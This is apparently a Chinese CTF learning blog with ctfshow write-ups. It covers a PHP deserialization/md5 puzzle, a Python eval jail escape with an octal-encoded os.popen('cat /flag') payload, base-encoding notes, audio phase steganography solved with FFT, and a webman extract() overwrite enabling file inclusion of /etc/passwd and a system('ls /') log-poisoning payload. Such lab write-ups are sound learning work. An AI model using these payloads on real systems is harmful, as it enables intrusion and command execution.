---
title: "ctfshow的试炼"
image: ''
pinned: false
comment: true
published: 2025-11-16
description: "CTF 学习笔记与技术复盘"
category: 刷题
tags: [刷题]
---
ctfshow的做题之路，这边我会把我感觉对自己很有帮助的题目以及wp写出来。

# #1.签到·好玩的PHP

这题目特别简洁但又难做，上代码

```
<?php
  error_reporting(0);
  highlight_file(__FILE__);

  class ctfshow {
    private $d = '';
    private $s = '';
    private $b = '';
    private $ctf = '';

​    public function __destruct() {
​      $this->d = (string)$this->d;
​      $this->s = (string)$this->s;
​      $this->b = (string)$this->b;

​      if (($this->d != $this->s) && ($this->d != $this->b) && ($this->s != $this->b)) {
​        $dsb = $this->d.$this->s.$this->b;

​        if ((strlen($dsb) <= 3) && (strlen($this->ctf) <= 3)) {
​          if (($dsb !== $this->ctf) && ($this->ctf !== $dsb)) {
​            if (md5($dsb) === md5($this->ctf)) {
​              echo file_get_contents("/flag.txt");
​            }
​          }
​        }
​      }
​    }
  }

  unserialize($_GET["dsbctf"]);
```

**if (($this->d != $this->s) && ($this->d != $this->b) && ($this->s != $this->b))**

(string)强制字符穿，弱比较三者，要求不等。

**拼接 `$dsb = $this->d . $this->s . $this->b;`**

`**if ((strlen($dsb) <= 3) && (strlen($this->ctf) <= 3)) **`

$dsb字符长度不超过3，$ctf同理。

**if (($dsb !== $this->ctf) && ($this->ctf !== $dsb))**

两者绝对不相等。

**md5($dsb) === md5($this->ctf)**

然后两者的md5值要求一定等。

代码大致含义如此，接下来想想怎么构造；

如果强制转换字符后，$d=1,$s=2,$b=3,组合后$dsb=123,然后让$ctf=整型类的123，两者相等，但一个字符，一个数字，比较不同，123也<=这样就满足了题意。

可是又有一个unserialize()这个函数，它要求我们php序列化后才能执行我们的传参，即形式为 s:长度:"键名"; 值;。

最后研究一下，得到了

**O:7:"ctfshow":4:{
  s:10:"\x00ctfshow\x00d"; s:1:"1";
  s:10:"\x00ctfshow\x00s"; s:1:"2";
  s:10:"\x00ctfshow\x00b"; s:1:"3";
  s:12:"\x00ctfshow\x00ctf"; i:123;
}**

然后url编码一下，**O%3A7%3A"ctfshow"%3A4%3A%7Bs%3A10%3A"%00ctfshow%00d"%3Bs%3A1%3A"1"%3Bs%3A10%3A"%00ctfshow%00s"%3Bs%3A1%3A"2"%3Bs%3A10%3A"%00ctfshow%00b"%3Bs%3A1%3A"3"%3Bs%3A12%3A"%00ctfshow%00ctf"%3Bi%3A123%3B%7D**

得到我们最后的传参值。

传参后得到flag，ctfshow{e29728f4-86f4-49d0-bbd7-03c5e383f4e6}

这一题的关键点在于序列化的过程，必须严格符合要求，否则一切都没用。



---



# #2.算力升级

其实一开始我以为这题应该跟上一题的算力超群的难度差不多，只要看一下题目是怎么计算的，然后用指令读取flag，没想到还是卡了一段时间，此题出自菜狗杯的web题算力升级。

![alt text](/images/QQ20251121-175940.png)

![alt text](/images/QQ20251121-180042.png)

1. ```
   1. \# !/usr/bin/env python
   2. \# -*-coding:utf-8 -*-
   3. """
   4. \# File       : app.py
   5. \# Time       ：2022/10/20 15:16
   6. \# Author     ：g4_simon
   7. \# version    ：python 3.9.7
   8. \# Description：算力升级--这其实是一个pyjail题目
   9. """
   10. from flask import *
   11. import os
   12. import re,gmpy2 
   13. import json
   14. \#初始化全局变量
   15. app = Flask(__name__)
   16. pattern=re.compile(r'\w+')
   17. @app.route('/', methods=['GET'])
   18. def index():  
   19. ​    return render_template('index.html')
   20. @app.route('/tiesuanzi', methods=['POST'])
   21. def tiesuanzi():
   22. ​    code=request.form.get('code')
   23. ​    for item in pattern.findall(code):#从code里把单词拿出来
   24. ​        if not re.match(r'\d+$',item):#如果不是数字
   25. ​            if item not in dir(gmpy2):#逐个和gmpy2库里的函数名比较
   26. ​               return jsonify({"result":1,"msg":f"你想干什么？{item}不是有效的函数"})
   27. ​    try:
   28. ​        result=eval(code)
   29. ​        return jsonify({"result":0,"msg":f"计算成功，答案是{result}"})
   30. ​    except:
   31. ​        return jsonify({"result":1,"msg":f"没有执行成功，请检查你的输入。"})
   32. @app.route('/source', methods=['GET'])
   33. def source():  
   34. ​    return render_template('source.html')
   35. if __name__ == '__main__':
   36. ​    app.run(host='0.0.0.0',port=80,debug=False)
   ```

   题目有给它的源码，大致能看懂。

   如果取出的不是数字就判断是否为gmpy2库(高精度算术运算库)的函数名，如果最后都是就eval(code)代码执行.

   所以我们得去看gmpy2库里到底有什么，有什么是我们能用的。

   一番查询后，发现这里面没有什么能派得上用场的，基本都是数学公式类型的函数。

   这个时候只能看看`__builtins__`这个初始工具箱了。

   *计算成功，答案是{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': , '__spec__': ModuleSpec(name='builtins', loader=), '__build_class__': , '__import__': , 'abs': , 'all': , 'any': , 'ascii': , 'bin': , 'breakpoint': , 'callable': , 'chr': , 'compile': , 'delattr': , 'dir': , 'divmod': , 'eval': , 'exec': , 'format': , 'getattr': , 'globals': , 'hasattr': , 'hash': , 'hex': , 'id': , 'input': , 'isinstance': , 'issubclass': , 'iter': , 'len': , 'locals': , 'max': , 'min': , 'next': , 'oct': , 'ord': , 'pow': , 'print': , 'repr': , 'round': , 'setattr': , 'sorted': , 'sum': , 'vars': , 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': , 'memoryview': , 'bytearray': , 'bytes': , 'classmethod': , 'complex': , 'dict': , 'enumerate': , 'filter': , 'float': , 'frozenset': , 'property': , 'int': , 'list': , 'map': , 'object': , 'range': , 'reversed': , 'set': , 'slice': , 'staticmethod': , 'str': , 'super': , 'tuple': , 'type': , 'zip': , '__debug__': True, 'BaseException': , 'Exception': , 'TypeError': , 'StopAsyncIteration': , 'StopIteration': , 'GeneratorExit': , 'SystemExit': , 'KeyboardInterrupt': , 'ImportError': , 'ModuleNotFoundError': , 'OSError': , 'EnvironmentError': , 'IOError': , 'EOFError': , 'RuntimeError': , 'RecursionError': , 'NotImplementedError': , 'NameError': , 'UnboundLocalError': , 'AttributeError': , 'SyntaxError': , 'IndentationError': , 'TabError': , 'LookupError': , 'IndexError': , 'KeyError': , 'ValueError': , 'UnicodeError': , 'UnicodeEncodeError': , 'UnicodeDecodeError': , 'UnicodeTranslateError': , 'AssertionError': , 'ArithmeticError': , 'FloatingPointError': , 'OverflowError': , 'ZeroDivisionError': , 'SystemError': , 'ReferenceError': , 'MemoryError': , 'BufferError': , 'Warning': , 'UserWarning': , 'DeprecationWarning': , 'PendingDeprecationWarning': , 'SyntaxWarning': , 'RuntimeWarning': , 'FutureWarning': , 'ImportWarning': , 'UnicodeWarning': , 'BytesWarning': , 'ResourceWarning': , 'ConnectionError': , 'BlockingIOError': , 'BrokenPipeError': , 'ChildProcessError': , 'ConnectionAbortedError': , 'ConnectionRefusedError': , 'ConnectionResetError': , 'FileExistsError': , 'FileNotFoundError': , 'IsADirectoryError': , 'NotADirectoryError': , 'InterruptedError': , 'PermissionError': , 'ProcessLookupError': , 'TimeoutError': , 'open': , 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}*
   
   通过这个计算机执行命令`gmpy2.__builtins__`看一下,一遍走马观花后发现了eval这个函数，那可太熟悉了，利用它构造

   ```
   ['eval']("__import__('os').popen('cat /flag').read()")
   ```
   
   这样一个指令，就可以读取目录下的flag文件，但是还有个问题，题目存在war，它对我们输入的东西进行拦截。

   ```
   pattern=re.compile(r'\w+')
   
   if item not in dir(gmpy2)
   ```
   
   输入的必须是数字，字母，下划线，如果不是，就要跟gmpy2的函数进行比较。

   而eval在`gmpy2.__builtins__`里，而不是直接在gmpy2里的，所以我们只能使用拼接的方法，e v a l，找一下gmpy2中我们需要的。

   随便查一下，我选择使用exp，invert，frac，log，所以我们要这样**['exp'[0]+'invert'[2]+'frac'[2]+'log'[0]**]拼接出['eval']。

   之后其实是可以纯拼接继续做的，但我以前看到过一个知识点，就是python是支持八进制转化的，就跟c语言asll码一样，所以正好，我们就可以用八进制来表示我们要的内容，具体转化方式上网查个表就能搞了，这边我就直接给出答案

   **\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51**

   组合得到最终的playload:

   `*gmpy2.__builtins__['exp'[0]+'invert'[2]+'frac'[2]+'log'[0]]('\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51')`*`

   输入后得到flag **ctfshow{c8b312c8-440d-475c-ab2d-b6b6c22bb749}**
   
   其实我nt了，其实eval也可以用八进制转化，只是当时我先想到的是拼接法，所以就没改了。

   总体无伤大雅。

   至于为什么不用16进制，我也不知道，问了ai，说是16进制有0x，会出问题，说不定以后就会遇到16进制转化的题目呢，学费了。
   
   


---


   # #3.base47

   这题我应该写在神秘小笔记里的，但是想到这是ctfshow菜狗杯的密码题，还是写在这里了。

   先看题目。

   ![alt text](/images/QQ20251121-210922.png)

   神必字符： `E9CV^T+HT5#X36RF4@LAU703+F$E-0N$@68LMXCVDRJJD5@MP#7MUZDTE?WWLG1S#L@+^66H@59KTWYK8TW0RV`

   神必字典：0123456789ABCDEFGHJKLMNPQRSTUVWXYZ?!@#$%^&*-+

   其实咋一眼我要直接映射了，这底下给的太像映射的题目了。

   不过看在base47，还是base解密吧。

   但是有一个问题，base只有45没有47。

   看了一下，底下的字典确实只有45个，缺少了I和O，估计这就是47的由来。

   正常的我要贴代码和解密过程了，但这一题，对我来说，算是一题搞清楚base体系的过程，所以我倒不想这么写。

   以前做题的时候并没有认真了解过base，所以基本都是直接丢工具与代码的，为了做题而使用。

   不过在做这一题的时候，我突发奇想就去了解了base，因此有了这一篇文章。

   一.base64

   **ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/**  这是base64所用到的字典，极少数情况下不一样。

   正正好好64个，它的计算方式是将我们所输入的东西转化为二进制，以3个字节为一组，即24bit，然后平均的分成4组，每组6个bit，然后转化为十进制数字，对照base64表进行加密。

   解密方式即为逆向，查看base64得到二进制数据，全部放在一起后，以八个为一组 ，计算ascll码，然后得到原文。

   base64特别明显的特征是尾部会有==或者=，这是为了补足字节加的，base32也有这个情况。

   二.base32

   base32我其实是没见过体型的，这里也做了解一下。

   **ABCDEFGHIJKLMNOPQRSTUVWXYZ234567** 这是它的字典，最明显的特征就是只有大写字母加数字。

   同样的32个正正好好。

   它则是将我们输入的东西转化二进制数据，以两个字节为一组，即16bit，然后5bit为一组，分成4组，最后一组不够补0.

   得到四组数据后，查表得到加密后的数据。

   解密的方式就是倒过来，具体的我就不描述了。

   它的特征同样是尾部有=，但它有时候可能会有很多个=，目的同样是补齐。

   三.base16

   这个就不讲了，四位一组的16进制转化。

   四.base58

   这个挺有意思的，它是比特币负责人改良base64而来的，据说是为了防止转账时出现的失误。

   它是先将我们输入的明文转为0x类型的16进制，再将数字组合，形成一个更大的16进制。eg：Hi  0x48和0x69,组合从成0x4869=18537(十进制)。  然后将这个十进制数据除以58，取余数，不断重复，直到商为0，余数为本身，然后将得来的余数按早晚的顺序，晚的在前，早的在后，即先除来的余数是排在后面的，这样排列之后得到一串数字，再根据base58表，一个余数一个余数的对应得到密文。

   它的字典是123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz。

   对了，有一点要注意，base58规定了索引0为1，所以如果是数字5，那对应的就是6。

   五.base85

   base85会将我们输入的内容按4字节一组的分配，如果一组中只有一个字节，则在3其后补0.

   它的计算方式和base58无不同，都是转16进制，组合，转回10进制。

   然后除85取余数，然后倒序排列余数，对照映射表，base85的映射表是ASCII33(`!`)到117(`u`)。

   即!"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstu。

   然后得密文。

   base体系还有其他的，这边我就不全介绍了。 




---

   

   # #4.这个不好听

   这一题我是没做出来的，所以，这一篇的文章并非wp类型，算是记录我在认真学习官方wp的日记吧。

   ![alt text](/images/QQ20251124-190629.png)

   题目给的附件是一个wav类型的音频。"C:\Users\G1731\Downloads\flag\flag.wav"

   如题目而言听是不能听的，完全是没有任何信息的。

   看到hint1，我第一印象居然是靶场的回归线方程，(捂脸)。

   这个印象深的勒。

   不说了，回到题目来。

   ![alt text](/images/QQ20251124-191107.png)

   我一开始是先用随波逐流看一下，这个音频是不是有什么隐藏文件，或者16进制存在信息，但非常的遗憾，什么也没有。

   这完全就是一个十分正常的音频，我又用010editor打开。

   ![alt text](/images/QQ20251124-191340.png)

   ![alt text](/images/QQ20251124-191349.png)

   依旧是什么信息没有，这个时候呢，我还不觉得这个会让我没有思路。

   我又想mp3隐写的工具看，但突然发现这个不是mp3文件啊，这个系列题目的上一题是MP3格式的，但这个不是。

   所以肯定不能用了。

   我又用wsl仔细看了看这个音频。

   **yu@localhost:/mnt/c/Users/G1731$ file /mnt/c/Users/G1731/flag.wav**
   **/mnt/c/Users/G1731/flag.wav: RIFF (little-endian) data, WAVE audio, IEEE Float, mono 44100 Hz**

   完全没有东西。

   这个时候，我想，估计就是仔细看看音轨了。

   audicity打开。

   ![alt text](/images/QQ20251124-192635.png)

   哇！！！！真是一点信息都没有，我本身这个音频类型的misc题型遇到的就不多，而且misc在我看来，是一个极考验灵光咋现和题量的版块，它不像web或者pwn或者re，需要代码审计，函数理解之类的可以很直接查到的东西，如果直接搜音频隐写，那是真的大海捞针，但是一旦有了一个正确的思路，就可以直接顺着思路，秒杀misc，唉，完全不知道该怎么办了，要说不是文件隐藏，那万一它是个啥数据流的隐藏，我又找不到，要说音频没有其他信息，那它有，我也想不到，题目是怎么隐藏的。

   

   ![alt text](/images/QQ20251124-193212.png)

   唯一我感觉有用的也就是这个，调整音频频率找到的跟三角函数很像的图像 ，这个也跟hint1的提醒有所关联。

   但，怎么把这个轨道提取出来，放在能让我推算的画板上呢。

   这也是一个问题。

   思来想去，我是找不到方法解决的，本来想问学长的，想想看，还是自己想吧。

   大概是几分钟后，我就决定还是看wp吧，这个是真不行，即便能提取出来，我稍微左右滑动了几下，这样的轨道有好多个，我要是能提取出来得到![QQ20251124-193812](C:\Users\G1731\Pictures\QQ20251124-193812.png信息就罢了，万一思路又是堵的，浪费时间也多，估计最后也是wp，那何不如早点wp。

   所以我就去打开了官方wp。

   ![alt text](/images/QQ20251124-193812.png)

   ![alt text](/images/QQ20251124-193822.png)

   ![alt text](/images/QQ20251124-193836.png)

   ![alt text](/images/QQ20251124-193845.png)

   ![alt text](/images/QQ20251124-193851.png)

   研究了快三天，我大致理解这是什么原理了。

   这个音频每0.1s断开一次，一共是有8种不同的音频轨道，根据相位从小到大排列0-7.

   然后一个一个的对应，将整个音频从头开始，0.1s 0.1s的分开，然后根据这个音频轨道是8种轨道的哪一个对应着记录下数字。

   最后得到一串八进制数据，然后在转化成字符，最终得到flag。

   原理有了，那要怎么复现呢， 真要手敲，我感觉就寄了，这完全就不是能实现的操作。

   这个堪比当年做靶场黑与白的情况，那个300多张图片，手敲三次还是出了问题，这个还这么多，更不能手搓了。

   官方的wp也只是提供了思路，并没有一个确切的做法。

   所以我这边就在研究能不能用脚本来搞。

   ```
   import numpy as np
   import scipy.io.wavfile as wav
   import libnum
   
   1. 设置文件路径 (根据你的截图改好了)
   
   file_path = r"C:\Users\G1731\flag.wav"
   
   print(f"📂 正在读取文件: {file_path}")
   
   try:
   
    使用 scipy 读取，Anaconda 默认自带这个库，绝对稳！
   
   ​    sample_rate, data = wav.read(file_path)
   ​    
   
    如果是双声道，取左声道
   
   ​    if len(data.shape) > 1:
   ​        data = data[:, 0]
   ​        
   ​    print(f"✅ 读取成功！采样率: {sample_rate}")
   except Exception as e:
   ​    print(f"❌ 读取失败: {e}")
   ​    exit()
   
   2. 准备变量
   
   flag_list = []
   step = sample_rate // 10  # 0.1秒切一段
   
   print("⚡️ 正在进行 FFT 相位分析...")
   
   3. 循环处理每一段
   
   for i in range(0, len(data), step):
       window = data[i : i + step]
       if len(window) < step:
           continue
   
    --- 核心算法 这步计算是 Excel 做不到的，必须用 fft
   
   ​    fft_res = np.fft.fft(window)
   
       取第25个频率点的相位
   
   ​    v = np.angle(fft_res[25])
   ​    
   
       4. 根据相位分类 (Writeup 里的阈值)
   
   ​    val = 7
   
       这些是相位角的阈值，不是电压
   
   ​    thresholds = [-2.5, -1.7, -0.7, 0, 0.7, 1.5, 2.4]
   ​    
   ​    for t in thresholds:
   ​        if v < t:
   ​            val -= 1
   ​    flag_list.append(val)
   
   5. 解码
   
   (j+4)%8 是题目特有的修正逻辑
   
   oct_str = ''.join([f'{(j + 4) % 8}' for j in flag_list])
   
   print(f"🔢 提取到的8进制数据: {oct_str}")
   
   6. 转成文字 Flag
   
   try:
       flag_bytes = libnum.n2s(int(oct_str, 8))
       print("\n" + "="*40)
       print("🎉 恭喜！Flag 是：")
       print(flag_bytes.decode('utf-8'))
       print("="*40)
   except Exception as e:
       print(f"解码有点小问题: {e}")
   
   
   ```

   这边是我通过ai得到的最终解题py代码，我还是写不来的。

   但这边我可以边分析边学习。

   前面引入库的代码以及读取文件的代码就不需要我分析了吧，重点来到我们的算法。

   ```
   
   
       如果是双声道，取左声道
       
       if len(data.shape) > 1:
           data = data[:, 0]
           
       print(f"✅ 读取成功！采样率: {sample_rate}")
   
   except Exception as e:
       print(f"❌ 读取失败: {e}")
       exit()
   
   
   ```

   对了这个，这个写法的由来是因为，我本来想试着用Excel搓数学模型失败后的产物。

   ![alt text](/images/QQ20251125-203319.png)

   我用工具提取线性数据，但还是没有成功搞到模型，所以这边就当是一个思路的辅助。

   ```
   2. 准备变量
   
   flag_list = []
   step = sample_rate // 10  # 0.1秒切一段
   
   print("⚡️ 正在进行 FFT 相位分析...")
   
   3. 循环处理每一段
   
   for i in range(0, len(data), step):
       window = data[i : i + step]
       if len(window) < step:
           continue
   
   
   ```

   本身我们难以跟用代码来直接得到我们的目的，因此我们必须慢慢来，我们需要得到所有数据流，每一个数据流占0.1s。

   这些数据流我们可以把它们当成一个一个的小点，所以我们要计算得到1s内有多少的数据点，然后将其除以10，得到0.1s的数据点/

   之后我们将整个音频分成含有固定数量数据点的0.1s片段。

   ```
       --- 核心算法 (完全复现题目原意) ---
       
       这步计算是 Excel 做不到的，必须用 fft
       
       fft_res = np.fft.fft(window)
       
       取第25个频率点的相位
       
       v = np.angle(fft_res[25])
   
   
       4. 根据相位分类 (Writeup 里的阈值)
       
       val = 7
       
       这些是相位角的阈值，不是电压
       
       thresholds = [-2.5, -1.7, -0.7, 0, 0.7, 1.5, 2.4]
       
       for t in thresholds:
           if v < t:
               val -= 1
       flag_list.append(val)
   
   
   ```

   这一步是用来确定每一组0.1s的数据流属于哪一个轨道的。

   

   ```
   1. 变换到频域 
    fft_res 是一个复数数组，长得像 [0+0j, 1+2j, 100+50j, ...] 
   数组的下标代表频率。下标0是直流电，下标1是1Hz... 
    fft_res = np.fft.fft(window)
    2. 锁定目标 # 为什么取 [25]？
   因为这段波在 0.1秒里震动了 25次（250Hz）。 
   经过 FFT 计算后，能量会集中在下标为 25 的那个格子里。 
   我们只关心主角，不关心其他的杂音。 
    target_complex_number = fft_res[25] 
   3. 提取相位 # 这个复数可以用向量表示。np.angle 就是算这个向量和X轴的夹角。 
   结果 v 是一个弧度值，范围是 -3.14 到 +3.14。
   v = np.angle(target_complex_number)
   ```

   这边就是完全不会的领域了。FFT 快速傅里叶变换，又是数学，大概理解就是，这个方法能够具体地得到，在这一组的0.1s 数据点，所拥有的能量，按它这边就是相位，这个就是提取这一组数据的相位，不是很好理解。

   这边用ai形象一下。

> 核心比喻：操场上的赛跑
> 想象一下：
>
> window (输入的波形数据)：这是0.1秒的一段录像。录像里有一个人在操场上跑圈（正弦波震动）。
>
> np.fft.fft (FFT变换)：这是一台**“超级分析仪”。它看完了这段录像，然后给出一份“体检报告”**。
>
> fft_res (报告结果)：这份报告里有无数行（数组），每一行对应不同的“跑圈速度”。
>
> fft_res[25]：这是报告的第25行，专门记录**“在这0.1秒内跑了25圈”**的那个人。
>
> 详细拆解每一行代码
> 1. fft_res = np.fft.fft(window)
> 发生了什么？
>
> window 里是一堆杂乱的时间点数据（比如：0.1秒时的电压、0.001秒时的电压...）。这时候我们只知道“他在跑”，但不知道他跑得快慢，也不知道他从哪起跑。
>
> fft 把这些数据转换成了**“频率桶 (Bins)”**。
>
> fft_res 是一个很长的数组。
>
> fft_res[0]：存的是“不动的人”（直流分量）。
>
> fft_res[1]：存的是“在这段时间里刚好只跑了 1圈 的人”。
>
> fft_res[2]：存的是“在这段时间里刚好跑了 2圈 的人”。
>
> ...
>
> fft_res[N]：存的是“跑了 N 圈的人”。
>
> 2. target = fft_res[25] —— 为什么偏偏是 25？
> 这是最关键的问题。
>
> 物理含义：
>
> 我们的时间窗口是 0.1秒。
>
> 下标 25 的意思是：在这个窗口（0.1秒）内，这个信号完成了 25 个完整的周期。
>
> 换算一下：
>
> 0.1秒跑了25圈 -> 1秒钟就能跑 250圈。
>
> 说明这个信号的频率是 250 Hz。
>
> 怎么知道是 25 的？
>
> 这是出题人设定的。在这个题目里，信号的主载波频率就是 250Hz。
>
> 如果你去画图（频谱图），你会发现只有在下标 25 的位置，柱子特别高（能量最大）。其他下标（比如 10, 30, 100）里虽然也有数，但都很小，是噪音。
>
> 所以我们只把“第25号选手”拎出来审问，其他人不管。
>
> 3. v = np.angle(target) —— 复数与相位
> 现在我们把 fft_res[25] 这个值拎出来了。 但这个值不是一个普通的数字（比如 100），而是一个复数（比如 3 + 4j）。
>
> 为什么要用复数？ 因为描述一个正在跑圈的人，需要两个信息：
>
> 幅度 (Amplitude)：他跑得有多猛？（步子迈得有多大？信号有多强？）
>
> 相位 (Phase)：录像开始的那一瞬间（0.00秒），他在跑道的哪个位置？
>
> 是在起跑线（0度）？
>
> 还是在半圈的位置（180度）？
>
> 还是在刚出发一点点的位置（45度）？
>
> 一个普通的数字（标量）没法同时记下这两个信息。复数可以！
>
> 想象一个坐标系：
>
> 复数 3 + 4j 就是坐标系上的点 (3, 4)。
>
> 原点到(3, 4)的距离：是幅度（我们这题不关心信号强弱，所以不看距离）。
>
> 原点连线与X轴的夹角：就是相位！
>
> np.angle(...) 是什么？
>
> 它就是一把量角器。
>
> 它测量复数点 (3, 4) 在坐标系里的角度。
>
> 它告诉我们：“哦，录像开始的时候，这个人在跑道的 0.93弧度（约53度）的位置。”

---



```
   4. 根据相位分类 (Writeup 里的阈值)

   val = 7

   这些是相位角的阈值，不是电压

   thresholds = [-2.5, -1.7, -0.7, 0, 0.7, 1.5, 2.4]

   for t in thresholds:
       if v < t:
           val -= 1
   flag_list.append(val)
```

---



核心算法过了后，后面的都比较好理解了，通过相位计算属于的0-7之间的数字，然后最后得到一串八进制数据流，解码最后得到flag。

**ctfshow{cd97fbc9-515f-496c-8c4f-d431a9ecc833}**

   

总结: 真是一场酣畅淋漓的学习之旅，整道题最核心的点莫过于对整个音频进行数据流的整理了，如果数据小一点，也不至于这么麻烦，我只能说misc真是大手子，轻易就干废了我。

   

---

   

# #5.迷雾重重

![alt text](/images/QQ20251127-165313.png)

做这题的时候想起了之前newstar的pop链，那一题的名字叫小羊走迷宫，那是我第一次遇到pop链，用了不少ai，但没有做出来，也不知道官方环境什么时候复现，回去看看。

好了好了，回到这一题来，这一题的考点两个，代码审计，加任意文件包含漏洞，其实还有点反序列化，但那是一个陷阱，卡了我两天了。

题目的附件就是源码，先做的就是好好研究源码。

![alt text](/images/QQ20251127-171343.png)

 压缩 一下，仔细研究这里面的好几个的php。

"C:\Users\G1731\Downloads\app\app\controller\IndexController.php"

```
<?php

namespace app\controller;

use support\Request;

use support\exception\BusinessException;

class IndexController

{

  public function index(Request $request)

  {

​    

​    return view('index/index');

  }

  public function testUnserialize(Request $request){

​    if(null !== $request->get('data')){

​      $data = $request->get('data');

​      unserialize($data);

​    }

​    return "unserialize测试完毕";

  }

  public function testJson(Request $request){

​    if(null !== $request->get('data')){

​      $data = json_decode($request->get('data'),true);

​      if(null!== $data && $data['name'] == 'guest'){

​        return view('index/view', $data);

​      }

​    }

​    return "json_decode测试完毕";

  }

  public function testSession(Request $request){

​    $session = $request->session();

​    $session->set('username',"guest");

​    $data = $session->get('username');

​    return "session测试完毕 username: ".$data;

  }

  public function testException(Request $request){

​    if(null != $request->get('data')){

​      $data = $request->get('data');

​      throw new BusinessException("业务异常 ".$data,3000);

​    }

​    return "exception测试完毕";

  }

}
```

好几个都是框架，害得我得一个一个的查，累死了。

其中令我耳目一新的就是这个php，也是这个代码害我一入反序列化不知深浅。

尝试构建各种rce或者文件写入，均失败，更气人的是这题目还有设置，不回显路径，完全就不让你知道错了，然后写入文件就是404，怎么样，文件中的命令都不被执行，只能说，g。

对了给一下，我利用的源代码吧，"C:\Users\G1731\Downloads\app\process\Monitor.php"，这个，将这个仔细的看来看去，也是找到能用的，虽然实际是没有成功的。

真正的方向是在"C:\Users\G1731\Downloads\app\vendor\workerman\webman-framework\src\support\view\Raw.php"

```
<?php
/**

 * This file is part of webman.
   *
 * Licensed under The MIT License
 * For full copyright and license information, please see the MIT-LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
   *
 * @author    walkor<walkor@workerman.net>
 * @copyright walkor<walkor@workerman.net>
 * @link      http://www.workerman.net/
 * @license   http://www.opensource.org/licenses/mit-license.php MIT License
   */

namespace support\view;

use Throwable;
use Webman\View;
use function app_path;
use function array_merge;
use function base_path;
use function config;
use function extract;
use function is_array;
use function ob_end_clean;
use function ob_get_clean;
use function ob_start;
use function request;

/**

 * Class Raw

 * @package support\view
   */
   class Raw implements View
   {
   /**

    * Assign.
    * @param string|array $name
    * @param mixed $value
      */
      public static function assign($name, $value = null)
      {
      $request = request();
      $request->_view_vars = array_merge((array) $request->_view_vars, is_array($name) ? $name : [$name => $value]);
      }

   /**

    * Render.

    * @param string $template

    * @param array $vars

    * @param string|null $app

    * @param string|null $plugin

    * @return false|string
      */
      public static function render(string $template, array $vars, string $app = null, string $plugin = null): string
      {
      $request = request();
      $plugin = $plugin === null ? ($request->plugin ?? '') : $plugin;
      $configPrefix = $plugin ? "plugin.$plugin." : '';
      $viewSuffix = config("{$configPrefix}view.options.view_suffix", 'html');
      $app = $app === null ? ($request->app ?? '') : $app;
      $baseViewPath = $plugin ? base_path() . "/plugin/$plugin/app" : app_path();
      $__template_path__ = $app === '' ? "$baseViewPath/view/$template.$viewSuffix" : "$baseViewPath/$app/view/$template.$viewSuffix";

      if(isset($request->_view_vars)) {
          extract((array)$request->_view_vars);
      }
      extract($vars);
      ob_start();
      // Try to include php file.
      try {
          include $__template_path__;
      } catch (Throwable $e) {
          ob_end_clean();
          throw $e;
      }

      return ob_get_clean();
      }
      }
```



---



      public static function render(string $template, array $vars, string $app = null, string $plugin = null): string
      {
      $request = request();
      $plugin = $plugin === null ? ($request->plugin ?? '') : $plugin;
      $configPrefix = $plugin ? "plugin.$plugin." : '';
      $viewSuffix = config("{$configPrefix}view.options.view_suffix", 'html');
      $app = $app === null ? ($request->app ?? '') : $app;
      $baseViewPath = $plugin ? base_path() . "/plugin/$plugin/app" : app_path();
      $__template_path__ = $app === '' ? "$baseViewPath/view/$template.$viewSuffix" : "$baseViewPath/$app/view/$template.$viewSuffix";
    
      if(isset($request->_view_vars)) {
          extract((array)$request->_view_vars);
      }
      extract($vars);
      ob_start();
      // Try to include php file.
      try {
          include $__template_path__;

   




---



public static function render($template, $vars, ...)

*`$__template_path__ = $app === '' ? ... : ...;`*

网站框架先计算出合法的物理文件路径，比如 `/var/www/html/app/view/index/index.html`，赋值给局部变量 `$__template_path__`。

*`extract($vars);`*是漏洞核心点。

`$vars` 是我们传入的数组。`extract` 默认配置是 `EXTR_OVERWRITE`（有同名变量直接覆盖）。

*`include $__template_path__;`*   最后包含这个路径。

接下来看看内存里，假设我们构造 Payload：`?data={"name":"guest", "__template_path__": "/etc/passwd"}`。

`$vars` 数组里就有了 `__template_path__` 这个key。

1. 代码先执行路径计算，`$__template_path__` 内存里是正常的 index.html 路径。

2. 代码执行 *`extract($vars)`*。

   解析到键 `"name"`，创建新变量 `$name`。

   解析到键 `"__template_path__"`，发现当前作用域里已经有这个变量了。

   因为没加 `EXTR_SKIP`，直接无视原值，强制覆盖。

   此时内存里 `$__template_path__` 变成了我们注入的 `"/etc/passwd"`。

3. 代码执行 *`include`*。

4. php 去读取 `$__template_path__`。

   读到的是被篡改后的路径，直接包含，文件覆盖就完成了。

但是文件覆盖了又能怎么样，不好意思，这个就很像cve了，我们完全可以弄个木马进去啊。

构造 payload：`?data={"name":"guest", "__template_path__": "<?php system('ls /');?>"}`

随后php就会尝试在文件系统里找一个名字叫 `<?php system('ls /');?>` 的文件。

结果当然是找不到的，所以php代码会显示错误。



---



      } catch (Throwable $e) {
          ob_end_clean();
          throw $e;



---

根据源代码，如果报错，那这个错误就会被扔到上层。

![alt text](/images/QQ20251127-184356.png)

所以最终这个错误就会被Log: :error($e)捕获，保留在网站的日志中。

